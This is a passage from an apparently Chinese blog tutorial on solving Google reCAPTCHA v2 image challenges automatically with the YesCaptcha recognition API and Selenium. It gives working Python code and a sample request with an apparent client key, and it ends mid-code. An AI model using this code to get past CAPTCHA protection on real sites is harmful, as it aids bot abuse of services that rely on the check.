                  <p><img src="https://cdn.cuiqingcai.com/a61km.png" alt=""></p>
                  <p>OK，然后我们可以查看下这里的官方文档：<a href="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169/ReCaptchaV2Classification+reCaptcha+V2" target="_blank" rel="noopener" title="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169/ReCaptchaV2Classification+reCaptcha+V2">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169/ReCaptchaV2Classification+reCaptcha+V2</a>，这里介绍介绍了一个 API，大致内容是这样的。</p>
                  <p>首先有一个创建任务的 API，API 地址为 <a href="https://api.yescaptcha.com/createTask" target="_blank" rel="noopener" title="https://api.yescaptcha.com/createTask">https://api.yescaptcha.com/createTask</a>，然后看下请求参数：</p>
                  <p><img src="https://cdn.cuiqingcai.com/458el.png" alt=""></p>
                  <p>这里我们需要传入这么几个参数：</p>
                  <ul>
                    <li>
                      <p>type：内容就是 ReCaptchaV2Classification</p>
                    </li>
                    <li>
                      <p>image：是验证码对应的 Base64 编码</p>
                    </li>
                    <li>
                      <p>question：对应的问题 ID，也就是识别目标的代号。</p>
                    </li>
                  </ul>
                  <p>比如这里我们可以 POST 这样的一个内容给服务器，结构如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"clientKey"</span>: <span class="string">"cc9c18d3e263515c2c072b36a7125eecc078618f"</span>,</span><br><span class="line">  <span class="attr">"task"</span>: &#123;</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"ReCaptchaV2Classification"</span>,</span><br><span class="line">    <span class="attr">"image"</span>: <span class="string">"/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDc...."</span>,</span><br><span class="line">    <span class="attr">"question"</span>: <span class="string">"/m/0k4j"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中这里 image 就可以是一个 3x3 或者 4x4 的验证码截图对应的 Base64 编码的字符串。</p>
                  <p>然后服务器就会返回类似这样的响应：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"errorId"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"errorCode"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"errorDescription"</span>: <span class="string">"null"</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"ready"</span>,</span><br><span class="line">  <span class="attr">"taskId"</span>: <span class="string">"3a9e8cb8-3871-11ec-9794-94e6f7355a0b"</span>,</span><br><span class="line">  <span class="attr">"solution"</span>: &#123;</span><br><span class="line">    <span class="attr">"objects"</span>: [<span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>], <span class="comment">// 图像需要点击的位置</span></span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"multi"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>OK，我们可以看到，返回结果的 solution 字段中的 objects 字段就包含了一些代号，比如这里是 <code>1, 5, 8</code>，什么意思呢？这个就是对应的目标点击代号。</p>
                  <p>对于 3x3 的图片来说，对应的代号就是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/7ysym.png" alt=""></p>
                  <p>对于 4x4 的图片来说，对应的代号就是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/b2eth.png" alt=""></p>
                  <p>OK，知道了代号之后，模拟点击就好办多了吧，我们用一些模拟点击操作就可以完成了。</p>
                  <h2 id="代码基础实现"><a href="#代码基础实现" class="headerlink" title="代码基础实现"></a>代码基础实现</h2>
                  <p>行，那有了基本思路之后，那我们就开始用 Python 实现下整个流程吧，这里我们就拿 <a href="https://www.google.com/recaptcha/api2/demo" target="_blank" rel="noopener" title="https://www.google.com/recaptcha/api2/demo">https://www.google.com/recaptcha/api2/demo</a> 这个网站作为样例来讲解下整个识别和模拟点击过程。</p>
                  <h3 id="识别封装"><a href="#识别封装" class="headerlink" title="识别封装"></a>识别封装</h3>
                  <p>首先我们对上面的任务 API 实现一下封装，来先写一个类：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> app.settings <span class="keyword">import</span> CAPTCHA_RESOLVER_API_KEY, CAPTCHA_RESOLVER_API_URL</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, api_url=CAPTCHA_RESOLVER_API_URL, api_key=CAPTCHA_RESOLVER_API_KEY)</span>:</span></span><br><span class="line">        self.api_url = api_url</span><br><span class="line">        self.api_key = api_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_task</span><span class="params">(self, image_base64_string, question_id)</span>:</span></span><br><span class="line">        logger.debug(<span class="string">f'start to recognize image for question <span class="subst">&#123;question_id&#125;</span>'</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"clientKey"</span>: self.api_key,</span><br><span class="line">            <span class="string">"task"</span>: &#123;</span><br><span class="line">                <span class="string">"type"</span>: <span class="string">"ReCaptchaV2Classification"</span>,</span><br><span class="line">                <span class="string">"image"</span>: image_base64_string,</span><br><span class="line">                <span class="string">"question"</span>: question_id</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(self.api_url, json=data)</span><br><span class="line">            result = response.json()</span><br><span class="line">            logger.debug(<span class="string">f'captcha recogize result <span class="subst">&#123;result&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">            logger.exception(</span><br><span class="line">                <span class="string">'error occurred while recognizing captcha'</span>, exc_info=<span class="literal">True</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>OK，这里我们就先定义了一个类 CaptchaResolver，然后主要接收两个参数，一个就是 <code>api_url</code>，这个对应的就是 <a href="https://api.yescaptcha.com/createTask" target="_blank" rel="noopener" title="https://api.yescaptcha.com/createTask">https://api.yescaptcha.com/createTask</a> 这个 API 地址，然后还有一个参数是 <code>api_key</code>，这个就是前文介绍的那个 ClientKey。</p>
                  <p>接着我们定义了一个 create_task 方法，接收两个参数，第一个参数 <code>image_base64_string</code> 就是验证码图片对应的 Base64 编码，第二个参数 <code>question_id</code> 就是要识别的目标是什么，这里就是将整个请求用 requests 模拟实现了，最后返回对应的 JSON 内容的响应结果就好了。</p>
                  <h3 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h3>
                  <p>OK，那么接下来我们来用 Selenium 来模拟打开这个实例网站，然后模拟点选来触发验证码，接着识别验证码就好了。</p>
                  <p>首先写一个大致框架：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.remote.webelement <span class="keyword">import</span> WebElement</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> app.captcha_resolver <span class="keyword">import</span> CaptchaResolver</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.browser = webdriver.Chrome()</span><br><span class="line">        self.browser.get(url)</span><br><span class="line">        self.wait = WebDriverWait(self.browser, <span class="number">10</span>)</span><br><span class="line">        self.captcha_resolver = CaptchaResolver()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.browser.close()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先在构造方法里面初始化了一个 Chrome 浏览器操作对象，然后调用对应的 get 方法打开实例网站，接着声明了一个 WebDriverWait 对象和 CaptchaResolver 对象，以分别应对节点查找和验证码识别操作，留作备用。</p>
                  <h3 id="iframe-切换支持"><a href="#iframe-切换支持" class="headerlink" title="iframe 切换支持"></a>iframe 切换支持</h3>
                  <p>接着，下一步我们就该来模拟点击验证码的入口，来触发验证码了对吧。</p>
                  <p>通过观察我们发现这个验证码入口其实是在 iframe 里面加载的，对应的 iframe 是这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/xcnxo.png" alt=""></p>
                  <p>另外弹出的验证码图片又在另外一个 iframe 里面，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/j5lgg.png" alt=""></p>
                  <p>Selenium 查找节点是需要切换到对应的 iframe 里面才行的，不然是没法查到对应的节点，也就没法模拟点击什么的了。</p>
                  <p>所以这里我们定义几个工具方法，分别能够支持切换到入口对应的 iframe 和验证码本身对应的 iframe，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_entry_iframe = self.browser.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'iframe[title="reCAPTCHA"]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_entry_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_entry_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_entry_iframe: WebElement = self.get_captcha_entry_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_entry_iframe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_content_iframe</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    self.browser.switch_to.default_content()</span><br><span class="line">    captcha_content_iframe = self.browser.find_element_by_xpath(</span><br><span class="line">        <span class="string">'//iframe[contains(@title, "recaptcha challenge")]'</span>)</span><br><span class="line">    <span class="keyword">return</span> captcha_content_iframe</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch_to_captcha_content_iframe</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    captcha_content_iframe: WebElement = self.get_captcha_content_iframe()</span><br><span class="line">    self.browser.switch_to.frame(captcha_content_iframe)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样的话，我们只需要调用 switch_to_captcha_content_iframe 就能查找验证码图片里面的内容，调用 switch_to_captcha_entry_iframe 就能查找验证码入口里面的内容。</p>
                  <h3 id="触发验证码"><a href="#触发验证码" class="headerlink" title="触发验证码"></a>触发验证码</h3>
                  <p>OK，那么接下来的一步就是来模拟点击验证码的入口，然后把验证码触发出来了对吧，就是模拟点击这里：</p>
                  <p><img src="https://cdn.cuiqingcai.com/6ro9y.png" alt=""></p>
                  <p>实现很简单，代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_captcha</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    captcha_entry = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.ID, <span class="string">'recaptcha-anchor'</span>)))</span><br><span class="line">    captcha_entry.click()</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    self.switch_to_captcha_content_iframe()</span><br><span class="line">    entire_captcha_element: WebElement = self.get_entire_captcha_element()</span><br><span class="line">    <span class="keyword">if</span> entire_captcha_element.is_displayed:</span><br><span class="line">        logger.debug(<span class="string">'trigged captcha successfully'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里首先我们首先调用 switch_to_captcha_entry_iframe 进行了 iframe 的切换，然后找到那个入口框对应的节点，然后点击一下。</p>
                  <p>点击完了之后我们再调用 switch_to_captcha_content_iframe 切换到验证码本身对应的 iframe 里面，查找验证码本身对应的节点是否加载出来了，如果加载出来了，那么就证明触发成功了。</p>
                  <h3 id="找出识别目标"><a href="#找出识别目标" class="headerlink" title="找出识别目标"></a>找出识别目标</h3>
                  <p>OK，那么现在验证码可能就长这样子了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/6igpt.png" alt=""></p>
                  <p>那接下来我们要做的就是两件事了，一件事就是把匹配目标找出来，就是上图中的加粗字体，第二件事就是把验证码进行保存，然后转成 Base64 编码，提交给 CaptchaResolver 来识别。</p>
                  <p>好，那么怎么查找匹配目标呢？也就是上图中的 traffice lights，用 Selenium 常规的节点搜索就好了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha_target_name</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    captcha_target_name_element: WebElement = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'.rc-imageselect-desc-wrapper strong'</span>)))</span><br><span class="line">    <span class="keyword">return</span> captcha_target_name_element.text</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>通过调用这个方法，我们就能得到上图中类似 traffic lights 的内容了。</p>
                  <h3 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h3>
                  <p>接着，我们对验证码图片进行下载，然后转 Base64 进行识别吧，整体代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_entire_captcha</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.entire_captcha_natural_width = self.get_entire_captcha_natural_width()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'entire_captcha_natural_width <span class="subst">&#123;self.entire_captcha_natural_width&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    self.captcha_target_name = self.get_captcha_target_name()</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'captcha_target_name <span class="subst">&#123;self.captcha_target_name&#125;</span>'</span></span><br><span class="line">    )</span><br><span class="line">    entire_captcha_element: WebElement = self.get_entire_captcha_element()</span><br><span class="line">    entire_captcha_url = entire_captcha_element.find_element_by_css_selector(</span><br><span class="line">        <span class="string">'td img'</span>).get_attribute(<span class="string">'src'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'entire_captcha_url <span class="subst">&#123;entire_captcha_url&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_ENTIRE_IMAGE_FILE_PATH, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(requests.get(entire_captcha_url).content)</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'saved entire captcha to <span class="subst">&#123;CAPTCHA_ENTIRE_IMAGE_FILE_PATH&#125;</span>'</span>)</span><br><span class="line">    resized_entire_captcha_base64_string = resize_base64_image(</span><br><span class="line">        CAPTCHA_ENTIRE_IMAGE_FILE_PATH, (self.entire_captcha_natural_width,</span><br><span class="line">                                         self.entire_captcha_natural_width))</span><br><span class="line">    logger.debug(</span><br><span class="line">        <span class="string">f'resized_entire_captcha_base64_string, <span class="subst">&#123;resized_entire_captcha_base64_string[<span class="number">0</span>:<span class="number">100</span>]&#125;</span>...'</span>)</span><br><span class="line">    entire_captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">        resized_entire_captcha_base64_string,</span><br><span class="line">        get_question_id_by_target_name(self.captcha_target_name)</span><br><span class="line">    )</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们首先获取了一些验证码的基本信息：</p>
                  <ul>
                    <li>entire_captcha_natural_width：验证码图片对应的图片真实大小，这里如果是 3x3 的验证码图片，那么图片的真实大小就是 300，如果是 4x4 的验证码图片，那么图片的真实大小是 450</li>
                    <li>captcha_target_name：识别目标名称，就是刚才获取到的内容</li>
                    <li>entire_captcha_element：验证码图片对应的节点对象。</li>
                  </ul>
                  <p>这里我们先把 entire_captcha_element 里面的 img 节点拿到，然后将 img 的 src 内容获取下来，赋值为 entire_captcha_url，这样其实就得到了一张完整的验证码大图，然后我们将其写入到文件中。</p>
                  <p>结果就类似这样的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/0hjjh.png" alt=""></p>
                  <p>接着我们把这个图片发给 YesCaptcha 进行识别就好了。</p>
                  <h3 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h3>
                  <p>接着，我们把这张图片转下 Base64 编码，定义这样一个方法：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resize_base64_image</span><span class="params">(filename, size)</span>:</span></span><br><span class="line">    width, height = size</span><br><span class="line">    img = Image.open(filename)</span><br><span class="line">    new_img = img.resize((width, height))</span><br><span class="line">    new_img.save(CAPTCHA_RESIZED_IMAGE_FILE_PATH)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_RESIZED_IMAGE_FILE_PATH, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        encoded_string = base64.b64encode(data)</span><br><span class="line">        <span class="keyword">return</span> encoded_string.decode(<span class="string">'utf-8'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里值得注意的是，由于 API 对图片大小有限制，如果是 3x3 的图片，那么我们需要将图片调整成 300x300 才可以，如果是 4x4 的图片，那么我们需要将图片调整成 450x450，所以这里我们先调用了 Image 的 resize 方法调整了大小，接着再转成了 Base64 编码。</p>
                  <h3 id="问题-ID-处理"><a href="#问题-ID-处理" class="headerlink" title="问题 ID 处理"></a>问题 ID 处理</h3>
                  <p>那问题 ID 怎么处理呢？通过 API 文档 <a href="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169" target="_blank" rel="noopener" title="https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169">https://yescaptcha.atlassian.net/wiki/spaces/YESCAPTCHA/pages/18055169</a> 我们可以看到如下映射表：</p>
                  <p><img src="https://cdn.cuiqingcai.com/qfyjb.png" alt=""></p>
                  <p>所以，比如假如验证码里面我们得到的是 traffic lights，那么问题 ID 就是 <code>/m/015qff</code>，行，那我们反向查找就好了，定义这么个方法：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">CAPTCHA_TARGET_NAME_QUESTION_ID_MAPPING = &#123;</span><br><span class="line">    <span class="string">"taxis"</span>: <span class="string">"/m/0pg52"</span>,</span><br><span class="line">    <span class="string">"bus"</span>: <span class="string">"/m/01bjv"</span>,</span><br><span class="line">    <span class="string">"school bus"</span>: <span class="string">"/m/02yvhj"</span>,</span><br><span class="line">    <span class="string">"motorcycles"</span>: <span class="string">"/m/04_sv"</span>,</span><br><span class="line">    <span class="string">"tractors"</span>: <span class="string">"/m/013xlm"</span>,</span><br><span class="line">    <span class="string">"chimneys"</span>: <span class="string">"/m/01jk_4"</span>,</span><br><span class="line">    <span class="string">"crosswalks"</span>: <span class="string">"/m/014xcs"</span>,</span><br><span class="line">    <span class="string">"traffic lights"</span>: <span class="string">"/m/015qff"</span>,</span><br><span class="line">    <span class="string">"bicycles"</span>: <span class="string">"/m/0199g"</span>,</span><br><span class="line">    <span class="string">"parking meters"</span>: <span class="string">"/m/015qbp"</span>,</span><br><span class="line">    <span class="string">"cars"</span>: <span class="string">"/m/0k4j"</span>,</span><br><span class="line">    <span class="string">"vehicles"</span>: <span class="string">"/m/0k4j"</span>,</span><br><span class="line">    <span class="string">"bridges"</span>: <span class="string">"/m/015kr"</span>,</span><br><span class="line">    <span class="string">"boats"</span>: <span class="string">"/m/019jd"</span>,</span><br><span class="line">    <span class="string">"palm trees"</span>: <span class="string">"/m/0cdl1"</span>,</span><br><span class="line">    <span class="string">"mountains or hills"</span>: <span class="string">"/m/09d_r"</span>,</span><br><span class="line">    <span class="string">"fire hydrant"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"fire hydrants"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"a fire hydrant"</span>: <span class="string">"/m/01pns0"</span>,</span><br><span class="line">    <span class="string">"stairs"</span>: <span class="string">"/m/01lynh"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_question_id_by_target_name</span><span class="params">(target_name)</span>:</span></span><br><span class="line">    logger.debug(<span class="string">f'try to get question id by <span class="subst">&#123;target_name&#125;</span>'</span>)</span><br><span class="line">    question_id = CAPTCHA_TARGET_NAME_QUESTION_ID_MAPPING.get(target_name)</span><br><span class="line">    logger.debug(<span class="string">f'question_id <span class="subst">&#123;question_id&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> question_id</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样传入名称，我们就可以得到问题 ID 了。</p>
                  <p>最后将上面的参数直接调用 CaptchaResovler 对象的 create_task 方法就能得到识别结果了。</p>
                  <h3 id="模拟点击"><a href="#模拟点击" class="headerlink" title="模拟点击"></a>模拟点击</h3>
                  <p>得到结果之后，我们知道返回结果的 objects 就是需要点击的验证码格子的列表，下面进行模拟点击即可：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">single_captcha_elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">          (By.CSS_SELECTOR, <span class="string">'#rc-imageselect-target table td'</span>)))</span><br><span class="line"><span class="keyword">for</span> recognized_index <span class="keyword">in</span> recognized_indices:</span><br><span class="line">    single_captcha_element: WebElement = single_captcha_elements[recognized_index]</span><br><span class="line">    single_captcha_element.click()</span><br><span class="line">    <span class="comment"># check if need verify single captcha</span></span><br><span class="line">    self.verify_single_captcha(recognized_index)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们首先得到了 recognized_indices 就是识别结果对应的标号，然后逐个遍历进行模拟点击。</p>
                  <p>对于每次点击，我们可以直接获取所有的验证码格子对应的节点，然后调用其 click 方法就可以完成点击了，其中格子的标号和返回结果的对应关系如图：</p>
                  <p><img src="https://cdn.cuiqingcai.com/1z01j.png" alt=""></p>
                  <blockquote>
                    <p>当然我们也可以通过执行 JavaScript 来对每个节点进行模拟点击，效果是类似的。</p>
                  </blockquote>
                  <p>这样我们就可以实现验证码小图的逐个识别了。</p>
                  <h3 id="小图识别"><a href="#小图识别" class="headerlink" title="小图识别"></a>小图识别</h3>
                  <p>等等，在识别过程中还发现了一个坑，那就是有时候我们点击完一个小格子之后，这个小格子就消失了！然后在原来的小格子的位置出现了一个新的小图，我们需要对新出现的图片进行二次识别才可以。</p>
                  <p>这个怎么处理呢？</p>
                  <p>我们其实可以在每点击完一个格子之后就来校验下当前小格子有没有图片刷新，如果有图片刷新，那么对应的 HTML 的 class 就会变化，否则就会包含 selected 字样，然后我们再继续对小格子对应的图进行二次识别就好了。</p>
                  <p>这里我们再定义一个方法：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre>
                        </td>
                        <td class="code">
